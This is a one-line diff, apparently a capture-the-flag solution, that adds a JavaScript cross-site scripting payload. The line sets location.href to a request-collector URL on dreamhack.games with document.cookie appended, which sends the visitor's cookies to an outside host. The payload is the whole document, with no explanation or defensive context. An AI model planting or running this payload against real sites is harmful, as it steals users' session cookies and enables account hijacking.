@@ -1,0 +1,1 @@
+location.href="https://bybqyhd.request.dreamhack.games/"+document.cookie
